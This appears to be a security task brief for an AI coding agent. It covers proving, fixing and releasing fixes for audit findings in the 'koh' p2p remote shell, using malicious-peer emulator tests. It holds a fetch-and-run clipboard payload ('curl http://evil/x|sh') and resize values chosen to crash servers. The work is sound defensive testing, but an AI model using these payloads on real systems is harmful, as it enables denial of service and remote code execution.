# TASK: Prove the koh security findings on the Android emulator, fix them, then release

## GOAL
Security TDD, **red → green**: first write Android-emulator tests that DEMONSTRATE each confirmed
audit finding is real (they fail against current koh because the vuln is present), then implement the
fixes, then show the SAME tests now prove the vuln is closed — and ship a security release.

## CONTEXT
You are in the `koh` repo (`/Users/kisaczka/Desktop/code/moshers2`) — a remote shell over iroh p2p
QUIC. An Apple-Silicon Android emulator + NDK are already set up; the opt-in emulator harness is under
`testing/android/scripts/` (read `lib.sh` and `stress-lib.sh` first; reuse their helpers). A security
audit produced these **confirmed** findings (file:line are current):

| ID | Sev | Finding | Where |
|----|-----|---------|-------|
| **H-1** | high | Peer-controlled terminal **resize is an unbounded-allocation OOM bomb**, both directions. `(rows,cols)` are arbitrary `u16` fed straight to `vt100`, which allocates `rows×cols` cells eagerly with no clamp. `(65000,65000)`≈135 GB → OOM-abort. Server side is **cross-tenant** (one process holds every peer's session). | server: `src/server/mod.rs:149-150` → `src/terminal/server.rs:163-164` (`set_size`); client: `src/terminal/mod.rs` apply (resize branch); decode `src/input.rs:131-132` |
| **M-2** | med | **Zero-dimension resize panics** the emulator (`vt100` computes `rows-1` unchecked → overflow panic / OOB). One datagram crashes the session. | same paths as H-1 |
| **M-1** | med | **Secret identity key written world-readable** (`std::fs::write` → 0644, no `0600`). The key IS the node identity → local impersonation. | `src/transport_iroh/mod.rs:75-91` (write at `:88`) |
| **L-4** | low | **`$KOH_PASSPHRASE` (all `KOH_*`) inherited into the spawned shell's env** — an authorized user can `echo $KOH_PASSPHRASE`. | `src/pty.rs:114-124` |
| **L-1** | low | **Malicious server silently overwrites the client's system clipboard via OSC-52** (no consent/opt-out/base64-validation). | emit `src/client/render.rs:267-273`; apply `src/terminal/mod.rs:259-261` |
| **L-2** | low | **Client re-emits attacker title/icon/clipboard with no client-side cap** (the 256/16 KiB caps live only in the trusted server emulator). | apply `src/terminal/mod.rs:253-261`; caps `src/terminal/server.rs:13,17` |
| **L-3** | low | **No cap on concurrent connections / handshakes / sessions** (accept loop `tokio::spawn`s unconditionally; under `--allow-any` each key gets a real shell). | `src/server/cli.rs` accept loop; `src/server/session.rs` store |

## HARD CONSTRAINTS (read first)
- **`unsafe_code = "forbid"`**; clippy denies the panic family on peer input (`unwrap`/`expect`/
  `panic`/`indexing_slicing`/`string_slice`), pedantic+nursery. Justify infallible sites with
  `#[expect(clippy::…, reason="…")]`.
- **All six green gates pass** after the fixes: `cargo fmt --check` · `cargo clippy --all-targets` ·
  `cargo clippy --target aarch64-linux-android` · `cargo test` · chaos example (`CONVERGED`) ·
  `cargo build --locked`. New fix logic gets **in-process unit tests** too.
- **Emulator tests stay opt-in** (`KOH_ANDROID_EMULATOR=1`), **CI-safe** (clean SKIP/exit 0 with no
  device), idempotent, never in default `cargo test` (the Rust gate is `#[ignore]`d).
- **Attack tooling must NOT ship in the published crate.** Put the malicious-peer helper in a
  SEPARATE crate under `testing/android/evil-peer/` (its own `Cargo.toml`, `path`-depends on koh) —
  `testing/` is already in koh's `exclude`, so it never enters the `.crate`. Do not add malicious
  binaries to koh's own `examples/` (those ship).

---

# PART A — Demonstrate the vulnerabilities (RED)

Each test asserts the **secure** behavior, so it currently FAILS (proving the bug). Some findings are
observable from the stock binary; the wire-level ones need a malicious peer.

## A0. Malicious-peer harness  (`testing/android/evil-peer/`)
A tiny crate that reuses koh's **public** library (`koh::transport_iroh`, `koh::ssp`, `koh::input`,
`koh::terminal`, `koh::wire`) to send CRAFTED protocol messages a stock koh peer never would. Two
binaries, cross-compiled for `aarch64-linux-android` with the same NDK linker the harness uses
(`build-android.sh` is the template):
- **`evil-client <server-id> --direct <ip:port> [--resize R C] [--passphrase P]`**: bind an endpoint
  (`bind_endpoint_local`), connect, run `handshake_client`, then drive a `Transport<UserInput,
  TerminalScreen>` like the real client but `push_resize(R, C)` with attacker-chosen values (e.g.
  `65000 65000` or `0 0`) and `tick()`/send. The number is just a `u16` it puts on the wire — the
  evil client does NOT allocate a big screen, so it sends cheaply while the SERVER allocates. This is
  the simplest, highest-impact demo (server-side cross-tenant OOM).
- **`evil-server [--resize R C] [--clipboard S] [--title S]`**: bind + accept a koh client, run
  `handshake_server(None)`, then SEND crafted `ScreenDiff`/`Instruction` WIRE BYTES directly
  (`ScreenDiff{ resize: Some((R,C)), … }`, or `.clipboard`/`.title` set to an oversized/attacker
  payload), `Instruction::encode` + `IrohChannel::send`. Build the wire bytes by hand so the evil
  server does NOT itself allocate the giant screen. Drives the client→OOM / clipboard-hijack demos.

> If a koh `pub` item you need isn't exposed (e.g. `ScreenDiff` field access, `Instruction` encode),
> note it — prefer demonstrating via the EASIER direction (evil-client → server) first, which needs
> only already-public `Transport`/`push_resize`.

## A1. H-1 server-side resize OOM  (`testing/android/scripts/sec-resize-oom-server.sh`)
Start a normal `koh serve` on the emulator; attach a benign witness client (the stock binary, via
`pty_connect_host_bg`) so there's a live session to destroy. Capture the server pid. Run
`evil-client --resize 65000 65000`. **Assert (secure):** the server process SURVIVES (pid still
alive after a few seconds) and the witness session is intact. **RED now:** the server gets
OOM-killed (pid gone), taking the witness session with it — proving the cross-tenant DoS.

## A2. M-2 zero-dimension panic  (`sec-resize-zero-panic.sh`)
Same setup; `evil-client --resize 0 0`. **Assert (secure):** server alive, no `panicked` in its log.
**RED now:** the server panics/aborts (pid gone / `panicked` in the log).

## A3. H-1 client-side resize OOM  (`sec-resize-oom-client.sh`)  [needs evil-server]
Run `evil-server --resize 65000 65000`; connect the stock `koh connect` (PTY) to it. **Assert
(secure):** the client process survives. **RED now:** the client OOM-aborts (pid gone). (If
hand-crafting the `ScreenDiff` wire bytes is impractical, document that and rely on A1/A2 + a unit
test for the client apply path — but try the evil-server path first.)

## A4. M-1 world-readable key  (`sec-key-perms.sh`)  — stock binary, no evil peer
Run `koh id --key-file /data/local/tmp/sec.key` (or let it use the default path) on the device, then
`adb shell stat -c '%a' <keyfile>`. **Assert (secure):** mode is `600`. **RED now:** mode is `644`.

## A5. L-4 passphrase env leak  (`sec-env-leak.sh`)  — stock binary, no evil peer
Use a `--shell` flood-script that records its env on spawn: body `env | grep '^KOH_PASSPHRASE=' >
/data/local/tmp/leak ; exec /system/bin/sh`. Start `KOH_PASSPHRASE=topsecret koh serve --allow-any
--shell <script>` (passphrase via env, the recommended path), connect a client to spawn the session,
then read `/data/local/tmp/leak`. **Assert (secure):** the file is EMPTY (no `KOH_PASSPHRASE` in the
shell's env). **RED now:** it contains `KOH_PASSPHRASE=topsecret` — the second factor leaked into the
shell.

## A6. L-1 clipboard hijack  (`sec-clipboard-hijack.sh`)  [needs evil-server]
`evil-server --clipboard 'curl http://evil/x|sh'`; connect the stock client with
`pty_connect_host_bg` (so the client's TUI output — what it writes to the terminal — is captured to a
HOST file). **Assert (secure):** the host capture does NOT contain `\x1b]52;c;` unless an explicit
opt-in is set. **RED now:** the client emits `\x1b]52;c;<base64-of-curl…>\x07` to the user's terminal
with no consent.

## A7. L-2 missing client-side cap  (`sec-title-cap.sh`)  [needs evil-server]
`evil-server --title <a 5000-char string>`; stock client via host capture. **Assert (secure):** the
emitted OSC-2 title is ≤ the cap (256 chars). **RED now:** the full 5000-char title is re-emitted.

## A8. L-3 connection/session flood  (`sec-conn-flood.sh`)  — stock binary
`koh serve --allow-any`; fire N (e.g. 40) `evil-client` (or stock connect) with DISTINCT keys
concurrently. **Assert (secure):** the count of `koh`/shell processes on the device stays bounded
(server enforces a cap; excess are rejected). **RED now:** N shells spawn unbounded. (Best-effort —
this one is more about bounding than a hard crash; assert a sane upper bound.)

Wire all the `sec-*.sh` into a `run-security.sh` orchestrator (mirror `run-stress.sh`), gated on
`KOH_ANDROID_EMULATOR=1`, and add an `#[ignore]`d `tests/android_security.rs` that shells out to it.
Run it once now and CONFIRM each test currently demonstrates its vuln (records the RED state).

---

# PART B — Implement the fixes

## B1. Clamp terminal geometry (closes H-1 **and** M-2) — the headline fix
Define a bound (e.g. `const MIN_DIM: u16 = 1; const MAX_DIM: u16 = 1000;` — generous vs any real
terminal). Clamp `rows`/`cols` to `[MIN_DIM, MAX_DIM]` **before any `vt100` call**, on BOTH:
- server: in `run_attached`'s `WireEvent::Resize` handler (`src/server/mod.rs:148-151`) before
  `s.pty.resize` and `s.emu.resize` (or inside `ServerTerminal::resize`, `src/terminal/server.rs:163`).
- client: in `TerminalScreen::apply`'s resize branch (`src/terminal/mod.rs`), before building the
  `vt100::Parser`.
Put the clamp in one shared helper so both paths agree. **Unit tests:** apply a `(65000,65000)` and a
`(0,0)` resize to both paths and assert the resulting screen is clamped (and does not OOM/panic).

## B2. Restrictive key-file permissions (M-1) — `src/transport_iroh/mod.rs`
In `load_or_create_secret_key`, create the dir `0700` and the file `0600` (cfg(unix)): write to a
temp file with `OpenOptions::new().create_new(true).mode(0o600)` then rename, and `DirBuilder::new()
.recursive(true).mode(0o700)`. On load, optionally warn if an existing key is group/other-readable.
Avoid `/data/local/tmp` for secrets in `state_dir_from` if a better app-private dir is available; at
minimum the file is `0600`. **Unit test:** create a key in a temp dir, assert `mode & 0o077 == 0`.

## B3. Scrub secrets from the child env (L-4) — `src/pty.rs`
Before spawning, `cmd.env_remove("KOH_PASSPHRASE")` (and the other operational `KOH_*` vars:
`KOH_LOG`, `KOH_STATE_DIR`, `KOH_DNS`, `KOH_PASSPHRASE`). **Unit test:** assert the built
`CommandBuilder`'s env contains no `KOH_PASSPHRASE` even when the parent process has it set.

## B4. Client-side title/clipboard caps (L-2) — `src/terminal/mod.rs`
In `TerminalScreen::apply`, truncate `title`/`icon`/`clipboard` to `MAX_TITLE_LEN` / 
`MAXIMUM_CLIPBOARD_SIZE` (lift these consts somewhere shared, or re-declare on the client) BEFORE
storing/emitting — independent of the server-side emulator caps. **Unit test:** apply an oversized
title/clipboard, assert it's truncated.

## B5. Make OSC-52 clipboard forwarding opt-in (L-1) — `src/client/render.rs` (+ a flag/env)
Default OFF. Only emit `\x1b]52;c;…` when the user opts in (`--clipboard` flag or `KOH_CLIPBOARD=1`).
When enabled, validate the payload is strict base64 and re-apply the size cap on the client. **Unit
test:** with the gate off, `OutOfBand::emit` produces no OSC-52 even when clipboard changes; with it
on + a valid payload, it does.

## B6. Connection / session cap (L-3) — `src/server/cli.rs` + `src/server/session.rs`
Add a `tokio::sync::Semaphore` bounding concurrent accept tasks (acquire a permit before/at spawn,
drop it on task exit via a guard) and a hard cap on live sessions / `SessionStore` size (reject new
peers when full). Make the bound a `--max-connections` / `--max-sessions` flag with a sane default.
**Unit/integration test** for the cap where feasible.

---

# PART C — Prove the fixes (GREEN)
Re-run `run-security.sh`. Every `sec-*.sh` must now PASS (the secure assertion holds): the server/
client survive the resize bombs and the zero-dim resize, the key is `600`, the shell env has no
`KOH_PASSPHRASE`, the client emits no OSC-52 without opt-in, the title is capped, and the connection
flood is bounded. Keep the witness-session assertions (the server surviving a malicious resize means
OTHER peers' sessions survive too). Run the full stress suite to confirm no regression, and the six
green gates.

---

# PART D — Ship
1. All gates green; `run-security.sh` green; full Android stress suite green.
2. Bump the crate version: **0.3.1** (a security patch). If you keep B5's opt-in default (clipboard
   no longer auto-forwarded = a behavior change), note it in the commit; a security default-change is
   acceptable in a patch, or go 0.4.0 if you prefer to flag it. No `PROTOCOL_VERSION` bump (these
   fixes don't change the wire format — the resize clamp constrains values, it doesn't re-encode).
3. Commit (logically: one `fix:` for the security fixes, one `test:` for the emulator security tests),
   push to `main`, then `cargo publish` (the credentials are in `~/.cargo/credentials.toml`; do a
   `cargo publish --dry-run` first; publishing is irreversible). Tag `v0.3.1` and push the tag.

## ACCEPTANCE CRITERIA
- Each `sec-*.sh` DEMONSTRATED its vuln before the fix (record the RED run) and PASSES after (GREEN).
- The resize clamp closes H-1 + M-2 (verified: a malicious `(65000,65000)` and `(0,0)` resize no
  longer kills the server or panics, on the live emulator) with unit tests on both paths.
- M-1: key file is `0600`. L-4: no `KOH_PASSPHRASE` in the shell env. L-2/L-5: client caps enforced.
  L-1: no OSC-52 without opt-in. L-3: connections/sessions bounded.
- Attack tooling lives only under `testing/android/evil-peer/` (NOT in the published crate); the
  `.crate` for 0.3.1 contains no malicious binaries (verify with `cargo package --list`).
- Six green gates pass; full stress suite passes; 0.3.1 published; `v0.3.1` tagged + pushed.

## HARNESS NOTES / PITFALLS (don't relearn these)
- Assert on the **server log** / `/proc` / process liveness, not client stdout: the client prints
  `connected.` before the server validates, and its TUI renders to the PTY — capture it via adb's
  LOCAL stdout (`pty_connect_host_bg`), not a device redirect.
- `adb shell -t -t` gives a real PTY; a non-TTY connect errors at raw mode (`os error 6`) right after
  `connected.` — expected. Capture `adb shell` exit codes via the `__RC__$?` sentinel.
- iroh coalesces same-node-id connections on loopback → use distinct keys for distinct registrations.
- "Process gone" is the OOM/panic signal: poll `pidof koh` / `/proc/<pid>/stat` before vs after the
  attack. An OOM is an abort (no `panicked` line); a zero-dim is a panic (`panicked` in the log).
- Build the evil-peer for `aarch64-linux-android` with the same NDK linker env as
  `scripts/build-android.sh`; push it to `/data/local/tmp/` alongside `koh`.
- After heavy churn the emulator loopback degrades — reboot for a clean run; wrap every `adb shell`
  in `gtimeout`.
